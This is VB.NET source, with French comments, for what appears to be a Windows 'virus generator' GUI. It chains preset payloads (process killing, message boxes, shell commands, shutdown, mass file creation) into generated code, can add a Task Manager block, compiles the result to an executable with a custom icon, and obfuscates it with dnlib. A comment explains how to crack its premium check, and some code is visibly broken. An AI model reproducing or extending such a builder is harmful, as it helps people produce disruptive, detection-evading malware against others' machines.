
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Configuration
Imports Microsoft.Win32
Imports dnlib.DotNet
Imports dnlib.DotNet.Emit

'https://github.com/DiamoonWolf
'2019 - 2020
'=============================






Public Class Form1

    Inherits System.Windows.Forms.Form
    Private Shared random As Random = New Random()
    Dim CodeDictionary As New Dictionary(Of String, String)
    '---
    '--- Appel et paramètrage de la dll Shell 32 bits
    '---
    <DllImport("shell32.dll")>
    Private Shared Function ExtractAssociatedIcon(ByVal hInst As IntPtr, <MarshalAs(UnmanagedType.LPStr)>
  ByVal lpIconPath As String, ByRef lpiIcon As Integer) As IntPtr
    End Function

    Friend WithEvents CopierToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox

    '--- Déclaration des variables de la feuille
    Private ico As Icon = Nothing


    Private Sub Colors()
        Dim Setthecolor As New ColorDialog()
        Setthecolor.Color = My.Settings.GeneralColorSave
        Setthecolor.FullOpen = True
        If (Setthecolor.ShowDialog() = DialogResult.OK) Then
            My.Settings.GeneralColorSave = Setthecolor.Color

            LogInTabControl1.UpLineColour = Setthecolor.Color
            LogInTabControl1.HorizontalLineColour = Setthecolor.Color

        End If
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Colors()
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        FlatAlertBox1.Location = New Point(950, 20)
        FlatAlertBox1.Location = New Point(1275, 34)

        Timer2.Start()
        FlatAlertBox1.Visible = True
        FlatAlertBox1.Enabled = True
        If My.Settings.CheckPremium = True Then
            FlatAlertBox1.Text = "Premium"
            FlatAlertBox1.kind = FlatAlertBox._Kind.Alert

            Label4.Text = "Utilisateur: " & My.Settings.U_Name
            Label5.Text = "Programmes générés: " & My.Settings.Generated

        Else
            FlatAlertBox1.Text = "Version d'essai"
            FlatAlertBox1.kind = FlatAlertBox._Kind.Info
            LogInTabControl1.TabPages(5).Enabled = False

            Label4.Text = "Utilisateur: " & My.Settings.U_Name
            Label5.Text = "Programmes générés: " & "Cette option n'est pas disponible dans la version d'essai."
        End If






    End Sub

    Private Sub LogInButtonWithProgress7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Batch File|*.bat"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            LogInNormalTextBox2.Text = ofd.FileName

            RichTextBox3.Text = File.ReadAllText(LogInNormalTextBox2.Text)
            Exit Sub
        Else
            LogInNormalTextBox2.Text = ""
        End If
    End Sub

    Private Sub LogInButtonWithProgress8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        MsgBox("Nothing")
    End Sub



#Region "Premium Alert"
    Private Sub FlatAlertBox1_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatAlertBox1.MouseHover
        FlatAlertBox1.Location = New Point(1151, 34)
    End Sub
    Private Sub FlatAlertBox1_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatAlertBox1.MouseLeave
        FlatAlertBox1.Location = New Point(1275, 34)
    End Sub

#End Region



#Region "PresetVirusList"
    Private Sub LogInCheckBox1_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox1.CheckedChanged
        If LogInCheckBox1.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox1.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox1.Text)
        End If

    End Sub
    Private Sub LogInCheckBox2_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox2.CheckedChanged
        If LogInCheckBox2.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox2.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox2.Text)
        End If
    End Sub
    Private Sub LogInCheckBox3_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox3.CheckedChanged
        If LogInCheckBox3.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox3.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox3.Text)
        End If
    End Sub
    Private Sub LogInCheckBox4_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox4.CheckedChanged
        If LogInCheckBox4.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox4.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox4.Text)
        End If
    End Sub
    Private Sub LogInCheckBox5_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox5.CheckedChanged
        If LogInCheckBox5.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox5.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox5.Text)
        End If
    End Sub
    Private Sub LogInCheckBox6_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox6.CheckedChanged
        If LogInCheckBox6.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox6.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox6.Text)
        End If
    End Sub
    Private Sub LogInCheckBox7_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox7.CheckedChanged
        If LogInCheckBox7.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox7.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox7.Text)
        End If
    End Sub
    Private Sub LogInCheckBox8_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox8.CheckedChanged
        If LogInCheckBox8.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox8.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox8.Text)
        End If
    End Sub
    Private Sub LogInCheckBox9_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox9.CheckedChanged
        If LogInCheckBox9.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox9.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox9.Text)
        End If
    End Sub
    Private Sub LogInCheckBox10_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox10.CheckedChanged
        If LogInCheckBox10.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox10.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox10.Text)
        End If
    End Sub
    Private Sub LogInCheckBox11_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox11.CheckedChanged
        If LogInCheckBox11.Checked = True Then

            NumericUpDown1.Enabled = True
        Else

            NumericUpDown1.Enabled = False
        End If
    End Sub
    Private Sub LogInCheckBox12_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox12.CheckedChanged
        If LogInCheckBox12.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox12.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox12.Text)
        End If
    End Sub
    Private Sub LogInCheckBox13_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox13.CheckedChanged
        If LogInCheckBox13.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox13.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox13.Text)
        End If
    End Sub
    Private Sub LogInCheckBox14_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox14.CheckedChanged
        If LogInCheckBox10.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox14.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox14.Text)
        End If
    End Sub
    Private Sub LogInCheckBox15_CheckedChanged(ByVal sender As System.Object) Handles LogInCheckBox15.CheckedChanged
        If LogInCheckBox15.Checked = True Then
            ListBox1.Items.Add(LogInCheckBox15.Text)
        Else
            ListBox1.Items.Remove(LogInCheckBox15.Text)
        End If
    End Sub
#End Region

#Region "ListBox"
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If ListBox1.SelectedIndex >= 0 Then

            Dim Selected As String = ListBox1.SelectedItem
            Dim Indx As Integer = ListBox1.Items.IndexOf(Selected)
            Dim Totl As String = ListBox1.Items.Count

            If Indx = 0 Then
                ListBox1.Items.Remove(Selected)
                ListBox1.Items.Insert(Totl - 1, Selected)
                ListBox1.SetSelected(Totl - 1, True)
            Else
                ListBox1.Items.Remove(Selected)
                ListBox1.Items.Insert(Indx - 1, Selected)
                ListBox1.SetSelected(Indx - 1, True)
            End If
        End If
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click

        If ListBox1.SelectedIndex >= 0 Then

            Dim Selected As String = ListBox1.SelectedItem
            Dim Indx As Integer = ListBox1.Items.IndexOf(Selected)
            Dim Totl As String = ListBox1.Items.Count

            If Indx = Totl - 1 Then
                ListBox1.Items.Remove(Selected)
                ListBox1.Items.Insert(0, Selected)
                ListBox1.SetSelected(0, True)
            Else
                ListBox1.Items.Remove(Selected)
                ListBox1.Items.Insert(Indx + 1, Selected)
                ListBox1.SetSelected(Indx + 1, True)
            End If
        End If
    End Sub

#End Region



    Private Sub LogInButtonWithProgress34_MouseHover(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress34.MouseHover
        LogInButtonWithProgress34.Value = 100
    End Sub

    Private Sub LogInButtonWithProgress34_MouseLeave(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress34.MouseLeave
        LogInButtonWithProgress34.Value = 0
    End Sub

    Private Sub LogInButtonWithProgress9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress9.Click
        Options_01.ShowDialog()

    End Sub
    Private Sub LogInButtonWithProgress15_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress15.Click
        Options_02.ShowDialog()
    End Sub
    Private Sub LogInButtonWithProgress17_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress17.Click
        Options_03.ShowDialog()
    End Sub
    '----
    Private Sub LogInButtonWithProgress23_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress23.Click
        Opt_04(LogInCheckBox5.Text, "file")
    End Sub

    Private Sub LogInButtonWithProgress21_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress21.Click
        Opt_04(LogInCheckBox5.Text, "direc")
    End Sub
    '----
    Private Sub LogInButtonWithProgress19_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress19.Click
        Options_05.ShowDialog()
    End Sub

    Private Sub LogInButtonWithProgress31_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress31.Click
        Options_06.ShowDialog()
    End Sub

    Private Sub LogInButtonWithProgress29_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress29.Click
        Options_07.ShowDialog()
    End Sub

    Private Sub LogInButtonWithProgress27_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress27.Click
        Options_08.ShowDialog()
    End Sub

    Private Sub LogInButtonWithProgress25_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress25.Click
        Options_09.ShowDialog()
    End Sub
    Private Sub LogInButtonWithProgress34_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress34.Click
        LogInTabControl1.SelectedIndex = 2

    End Sub



    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Form2.ListBox1.DisplayMember = ListBox1.DisplayMember 'colonne de la datatable à afficher quand la datasource est une datatable
        Form2.ListBox1.ValueMember = ListBox1.ValueMember 'pas obligé..

        Dim items(ListBox1.SelectedItems.Count - 1) As Object
        ListBox1.SelectedItems.CopyTo(items, 0)
        Form2.ListBox1.Items.AddRange(items)



    End Sub



    Private Sub CodeVBNetPersonnaliséToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CodeVBNetPersonnaliséToolStripMenuItem.Click
        LogInTabControl1.SelectedIndex = 4
    End Sub
    Private Sub OuvrirLéditeurDeCodeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ÖuvrirLéditeurDeCodeToolStripMenuItem.Click
        CodeEditor()
        LogInTabControl1.SelectedIndex = 4
        RichTextBox4.Text = RichTextBox4.Text + vbNewLine + My.Resources.CodeEnd
    End Sub
    Private Sub LogInButtonWithProgress12_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress12.Click
        ContextMenuStrip2.Show(MousePosition)

    End Sub
    Private Sub CodeEditor()

        Dim TtlItems As String = ListBox1.Items.Count
        Dim vari As Integer
        'Dim CurrentItem As String = ListBox1.SelectedItem
        'Dim Indx As Integer = ListBox1.Items.IndexOf(CurrentItem




        'MsgBox(ListBox1.SelectedItem.ToString)




        RichTextBox4.Text = My.Resources.CodeStart
        For vari = 1 To TtlItems
            RichTextBox4.Text = RichTextBox4.Text + vbNewLine

            ListBox1.SetSelected(vari - 1, True)

            If ListBox1.SelectedItem.ToString = LogInCheckBox1.Text Then
                RichTextBox4.Text = RichTextBox4.Text + My.Resources.PresetVir_No_001

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox2.Text Then
                RichTextBox4.Text = RichTextBox4.Text + My.Resources.PresetVir_No_002

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox3.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_003"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox4.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_004"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox5.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_005"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox6.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_006"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox7.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_007"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox8.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_008"

            ElseIf ListBox1.SelectedItem.ToString = LogInCheckBox9.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_009"

            ElseIf ListBox1.SelectedItem.ToStringoString = LogInCheckBox10.Text Then
                RichTextBox4.Text = RichTextBox4.Text + "My.Resources.PresetVir_No_0010"

            End If




        Next



    End Sub

#Region "Compiler"

    Private Sub LogInButtonWithProgress36_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ImporterHelloWorldToolStripMenuItem.Click
        RichTextBox4.Text = My.Resources.Vir_HelloWorld
    End Sub



    Private Sub Compilation(DestinationPath As String, CompileIcon As String)

        If RichTextBox4.Text = "" Then Exit Sub
        Dim cc As String = "'Custom" & vbNewLine
        cc += "'-----------------------------------------------------------------------" & vbNewLine

        Dim StrTemp As String = RichTextBox4.Text

        If logincheckuseallimport.Checked = True Then
            For Each itemChecked In CheckedListBox1.CheckedItems
                If RichTextBox4.Text.Contains(itemChecked.ToString()) Then
                Else
                    cc += itemChecked.ToString & vbNewLine
                End If

            Next
        Else
            For i As Integer = 0 To CheckedListBox1.Items.Count - 1
                If RichTextBox4.Text.Contains(CheckedListBox1.Items.Item(i)) Then
                Else
                    cc += CheckedListBox1.Items.Item(i).ToString & vbNewLine
                End If
            Next
        End If




        Ch_Listbx_Duplicates() 'Remove Import Duplicates

        iCompiler.GenerateExecutable(DestinationPath, cc + StrTemp, CompileIcon) ' Compile the source using CodeDom
        RichTextBox4.Text = StrTemp
        My.Settings.Generated += 1
        SetD(My.Settings.Generated)



        Try
            If LogInOnOffSwitch1.Toggled = False Then
                My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\Tmp\")
                File.Copy(LogInNormalTextBox4.Text, Application.StartupPath & "\Tmp\tmpfile.exe", True)
                Dim [module] As ModuleDefMD = ModuleDefMD.Load(LogInNormalTextBox4.Text)
                Dim assembly As AssemblyDef = AssemblyDef.Load(LogInNormalTextBox4.Text)
                ProtectName(assembly, [module])

                Process.Start("cmd", "/c del /f " & LogInNormalTextBox4.Text)
                [module].Write(Application.StartupPath & "\Tmp\tmpfile.exe")

                If LogInCheckBox11.Checked = True Then
                    junkattrib([module])
                    [module].Write(Application.StartupPath & "\Tmp\tmpfile.exe")
                End If


                Process.Start("cmd", "/c del /f " & Application.StartupPath & "\Tmp\tmpfile.exe")
                File.Copy(Application.StartupPath & "\Tmp\tmpfile.exe", LogInNormalTextBox4.Text, True)
               
            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
        Label4.Text = "Utilisateur:  " & My.Settings.U_Name
        Label5.Text = "Programmes générés: " & My.Settings.Generated
        MsgBox("Compilation terminée !", vbInformation)

    End Sub
    Private Sub LogInNormalTextBox3_Click(sender As Object, e As EventArgs) Handles LogInNormalTextBox3.TextChanged
        LabelNomVirus.Text = LogInNormalTextBox3.Text
        LogInNormalTextBox4.Text = My.Settings.FavDir & "\" & LogInNormalTextBox3.Text & ".exe"
    End Sub

    Public Function OutPath() As String
        Try
            Dim dlg As New FolderBrowserDialog()

            If dlg.ShowDialog() = DialogResult.OK Then
                Dim path As String = dlg.SelectedPath
                Label2.Text = path
                My.Settings.FavDir = path
                Return path
            End If

        Catch ex As Exception
            CheckError("Une erreur est survenue.")
        End Try
    End Function
    Private Sub LogInButtonWithProgress33_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress33.Click
        OutPath()
    End Sub
    Private Sub TesterLaCompilationToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TesterLaCompilationToolStripMenuItem.Click

        Try
            Dim sfd As New SaveFileDialog ' New SaveFileDialog to chosse the server location
            sfd.Filter = "Executable|*.exe"
            If sfd.ShowDialog = Windows.Forms.DialogResult.OK Then
                Compilation(sfd.FileName, "")

                TesterLeCodeToolStripMenuItem.Enabled = True
                Label1.Text = sfd.FileName

                'Obfuscation()
            Else : Exit Sub
            End If

        Catch ex As Exception

        End Try
    End Sub
    Private Sub TesterLeCodeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TesterLeCodeToolStripMenuItem.Click
        Process.Start(Label1.Text)
    End Sub

    Private Sub OuvrirToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OuvrirToolStripMenuItem.Click
        TesterLeCodeToolStripMenuItem.Enabled = False
        Dim ofd As New OpenFileDialog
        ofd.Filter = "Visual Basic File|*.vb"
        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then
            ToolStripStatusLabel1.Text = ofd.FileName
            If EditerToolStripMenuItem.Text = "Editer" Then
                RichTextBox4.Text = File.ReadAllText(ToolStripStatusLabel1.Text)
                Exit Sub
            End If

        Else
            ToolStripStatusLabel1.Text = ""
        End If
    End Sub

    Private Sub ImporterHelloWorldToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ImporterHelloWorldToolStripMenuItem.Click
        RichTextBox4.Text = My.Resources.Vir_HelloWorld

        TesterLeCodeToolStripMenuItem.Enabled = False
    End Sub
#End Region


    Private Sub EditerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles EditerToolStripMenuItem.Click


    End Sub

    Private Sub ViderToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ViderToolStripMenuItem.Click
        RichTextBox4.Text = Nothing

        TesterLeCodeToolStripMenuItem.Enabled = False
    End Sub

    Private Sub FlatAlertBox1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FlatAlertBox1.Click
        FlatAlertBox1.Visible = True

    End Sub


    Private Sub LogInButtonWithProgress2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress2.Click
        '--- appel de la boîte de dialogue de windows
        '--- pour trouver les icônes possibles
        OpenFileDialog1.Filter = "Icons|*.ico"
        OpenFileDialog1.FileName = Nothing
        If OpenFileDialog1.ShowDialog = DialogResult.Cancel Then
            Return
        Else
            '--- Envoie dans le textbox le resultat trouvé
            txticone.Text = OpenFileDialog1.FileName

        End If

        '--- Seulement si les valeurs sont correctes
        If Not (txticone.Text = String.Empty) Then


            If System.IO.File.Exists(txticone.Text) Then
                setPicIcon()
                'Me.Icon = System.Drawing.Icon.ExtractAssociatedIcon(txticone.Text)
            End If
            '====================================================
        Else
            MessageBox.Show("Vous devez sélectionner un fichier", "Erreur")
        End If
    End Sub

    Private Sub setPicIcon()

        Dim hInst As IntPtr = Marshal.GetHINSTANCE([Assembly].GetExecutingAssembly.GetModules()(0))
        Dim iIcon As Int32 = 0
        Dim hIcon As IntPtr

        hIcon = ExtractAssociatedIcon(hInst, txticone.Text, iIcon)
        ico = Icon.FromHandle(hIcon)

        PictIncone.Image = ico.ToBitmap

    End Sub

    Private Sub LogInButtonWithProgress3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogInButtonWithProgress3.Click
        Dim value As String = ListBox1.SelectedItem.ToString
        Select Case value
            Case LogInCheckBox1.Text
                RichTextBox4.Text = "Dim myProcesses As Process() = Process.GetProcessesByName(" & Chr(34) & My.Settings.ProcessKill_Process.ToString & Chr(34) & ")
        Dim myProcess As Process
        For Each myProcess In myProcesses
            myProcess.Kill()
        Next myProcess"


            Case LogInCheckBox2.Text
                RichTextBox4.Text = " Dim Msg, Style, Title
        Msg = " & My.Settings.MsgBox_Message & "
        Style = " & My.Settings.MsgBox_Style & "
        Title = " & My.Settings.MsgBox_Title & "
        MsgBox(Msg, Style, Title)"

            Case LogInCheckBox3.Text
                RichTextBox4.Text = "Shell (" & Chr(34) & My.Settings.PresetVir_No_003.ToString & Chr(34) & ")"

            Case LogInCheckBox4.Text
                RichTextBox4.Text = "Shell (" & Chr(34) & My.Settings.PresetVir_No_004.ToString & Chr(34) & ")"
            Case LogInCheckBox5.Text

            Case LogInCheckBox6.Text

            Case Else

        End Select
        LogInTabControl1.SelectedIndex = 3
    End Sub
    Private Sub LogInButtonWithProgress35_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress35.Click
        LogInTabControl1.SelectedIndex = 2
        CodeDictionary.Add(RichTextBox4.Text, Nothing)
    End Sub
    Private Sub logincheckimport_CheckedChanged(sender As Object) Handles logincheckimport.CheckedChanged
        If logincheckimport.Checked = True Then
            logincheckuseallimport.Enabled = True
            CheckedListBox1.Enabled = True

        ElseIf logincheckimport.Checked = False Then
            logincheckuseallimport.Enabled = False
            CheckedListBox1.Enabled = False
        End If
    End Sub

    Private Sub logincheckuseallimport_CheckedChanged(sender As Object) Handles logincheckuseallimport.CheckedChanged
        Dim checked As Boolean = True
        If logincheckuseallimport.Checked = True Then
            checked = True
        Else
            checked = False
        End If
        For i As Integer = 0 To CheckedListBox1.Items.Count - 1
            CheckedListBox1.SetItemChecked(i, checked)
        Next
    End Sub

    Private Sub LogInButtonWithProgress4_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress4.Click
        CheckedListBox1.Items.Add(LoginNormalTxt_Import.Text)
    End Sub

    Private Sub LogInButtonWithProgress5_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress5.Click

        If CheckedListBox1.CheckedItems.Count > 0 Then
            For checked As Integer = CheckedListBox1.CheckedItems.Count - 1 To 0 Step -1
                CheckedListBox1.Items.Remove(CheckedListBox1.CheckedItems(checked))
            Next

        End If
        Ch_Listbx_Duplicates()


    End Sub

    Private Sub LogInButtonWithProgress6_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress6.Click
        For checked As Integer = CheckedListBox1.CheckedItems.Count - 1 To 0 Step -1
            CheckedListBox1.Items.Remove(CheckedListBox1.Items.Item(checked))
        Next
        With CheckedListBox1.Items
            .Add("Imports Microsoft.VisualBasic")
            .Add("Imports System")
            .Add("Imports System.Collections.Generic")
            .Add("Imports System.Diagnostics")
            .Add("Imports System.IO")
            .Add("Imports System.IO.Compression")
            .Add("Imports System.Runtime.InteropServices")
            .Add("Imports System.Text")
            .Add("Imports System.Windows.Forms")
            .Add("Imports Microsoft.Win32")
        End With
        Ch_Listbx_Duplicates()
    End Sub
    Private Sub Ch_Listbx_Duplicates()
        CheckedListBox1.Refresh()
        Dim index As Integer
        Dim itemcount As Integer = CheckedListBox1.Items.Count

        If itemcount > 1 Then
            Dim lastitem As String = CheckedListBox1.Items(itemcount - 1)

            For index = itemcount - 2 To 0 Step -1
                If CheckedListBox1.Items(index) = lastitem Then
                    CheckedListBox1.Items.RemoveAt(index)
                Else
                    lastitem = CheckedListBox1.Items(index)
                End If
            Next
        End If

    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

        FlatAlertBox1.Visible = True
        LabelNomVirus.Text = LogInNormalTextBox3.Text
        LabelPathVirus.Text = LogInNormalTextBox4.Text
        LogInNormalTextBox4.Text = My.Settings.FavDir & "\" & LogInNormalTextBox3.Text & ".exe"
        Label2.Text = My.Settings.FavDir
        'Si tu veux cracker ce programme je te conseille de changer la condition ci-dessous et c'est parfait, changer True en False devrait faire l'affaire
        If My.Settings.CheckPremium = True Then
            FlatAlertBox1.Text = "Premium"
            FlatAlertBox1.kind = FlatAlertBox._Kind.Alert

            Label4.Text = "Utilisateur: " & My.Settings.U_Name
            Label5.Text = "Programmes générés: " & My.Settings.Generated

        Else
            FlatAlertBox1.Text = "Version d'essai"
            FlatAlertBox1.kind = FlatAlertBox._Kind.Info
            LogInTabControl1.TabPages(5).Enabled = False
            LogInTabControl1.TabPages(3).Enabled = False

            Label4.Text = "Utilisateur: " & My.Settings.U_Name
            Label5.Text = "Programmes générés: " & "Cette option n'est pas disponible" + vbNewLine + " dans la version d'essai."
        End If
    End Sub

    Private Sub LogInButtonWithProgress1_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress1.Click
        If ListBox1.Items.Count = 0 Then

            Exit Sub
        End If
        ListBox1.SelectedIndex = 0
        Dim VirAsso As Dictionary(Of String, String) = New Dictionary(Of String, String) From {
    {LogInCheckBox1.Text, My.Settings.PresetVir_No_001},
    {LogInCheckBox2.Text, My.Settings.PresetVir_No_002},
    {LogInCheckBox3.Text, My.Settings.PresetVir_No_003},
    {LogInCheckBox4.Text, My.Settings.PresetVir_No_004},
    {LogInCheckBox5.Text, My.Settings.PresetVir_No_005},
    {LogInCheckBox6.Text, My.Settings.PresetVir_No_006},
    {LogInCheckBox7.Text, My.Settings.PresetVir_No_007},
    {LogInCheckBox8.Text, My.Settings.PresetVir_No_008},
    {LogInCheckBox9.Text, My.Settings.PresetVir_No_009},
    {LogInCheckBox10.Text, My.Settings.PresetVir_No_010}
    }

        'Imports
        Dim v_Imports As String
        For Each items In CheckedListBox1.Items
            v_Imports += items.ToString() & vbNewLine
        Next
        '========

        Dim finalRslt As String = v_Imports & vbNewLine & "Namespace custom
    Public Class custom
        Shared Sub Main(ByVal args() As String)" & vbNewLine

        'Options spéciales
        If LogInOnOffSwitch6.Toggled = False Then
            finalRslt += My.Settings.PresetOption_No_001
        End If
        If LogInOnOffSwitch4.Toggled = False Then
            finalRslt += My.Settings.AvoidTskmngr
        End If
        '==================


        For i As Integer = 0 To ListBox1.Items.Count - 1
            If (ListBox1.SelectedIndex < ListBox1.Items.Count - 1) Then

                finalRslt += VirAsso.Item(ListBox1.Items(ListBox1.SelectedIndex)) & vbNewLine
                ListBox1.SelectedIndex += 1
            End If
        Next
        finalRslt += VirAsso.Item(ListBox1.Items(ListBox1.SelectedIndex)) & vbNewLine
        finalRslt += vbNewLine & "End Sub
    End Class
End Namespace"
        RichTextBox4.Text = finalRslt



        Label4.Text = "Utilisateur: " & My.Settings.U_Name
        Label5.Text = "Programmes générés: " & My.Settings.Generated



        Compilation(LogInNormalTextBox4.Text, txticone.Text)
    End Sub

    Private Sub LogInButtonWithProgress11_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress11.Click
        Dim VirAsso As Dictionary(Of String, String) = New Dictionary(Of String, String) From {
    {LogInCheckBox1.Text, My.Settings.PresetVir_No_001},
    {LogInCheckBox2.Text, My.Settings.PresetVir_No_002},
    {LogInCheckBox3.Text, My.Settings.PresetVir_No_003},
    {LogInCheckBox4.Text, My.Settings.PresetVir_No_004},
    {LogInCheckBox5.Text, My.Settings.PresetVir_No_005},
    {LogInCheckBox6.Text, My.Settings.PresetVir_No_006},
    {LogInCheckBox7.Text, My.Settings.PresetVir_No_007},
    {LogInCheckBox8.Text, My.Settings.PresetVir_No_008},
    {LogInCheckBox9.Text, My.Settings.PresetVir_No_009},
    {LogInCheckBox10.Text, My.Settings.PresetVir_No_010}
    }
        MsgBox("Code de l'élément : " & vbNewLine & vbNewLine & VirAsso.Item(ListBox1.Items(ListBox1.SelectedIndex)))
    End Sub

    Private Sub LogInButtonWithProgress10_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress10.Click
        Info(LogInCheckBox1.Text, "Permet d'arrêter un processus choisi dans les options." & vbNewLine & "Toutes les instances de ce processus seront fermées.")
    End Sub

    Private Sub LogInButtonWithProgress14_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress14.Click
        Info(LogInCheckBox2.Text, "Permet d'afficher une boite de messages personalisée. Vous pouvez avoir un aperçu dans la page 'Options'.")
    End Sub

    Private Sub LogInButtonWithProgress16_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress16.Click
        Info(LogInCheckBox2.Text, "Permet d'ârrêter, redémarrer mettre en veille l'ordinateur, fermer la session, et ajoutant des options comme un délais ou un message customisé.")
    End Sub

    Private Sub LogInButtonWithProgress22_Click(sender As Object, e As EventArgs) Handles LogInButtonWithProgress22.Click
        Info(LogInCheckBox2.Text, "Permet de créer une multitude de fichiers, vous choisissez l'extension du fichier à créer, leur réperoire, ainsi que combien en créer.")
    End Sub

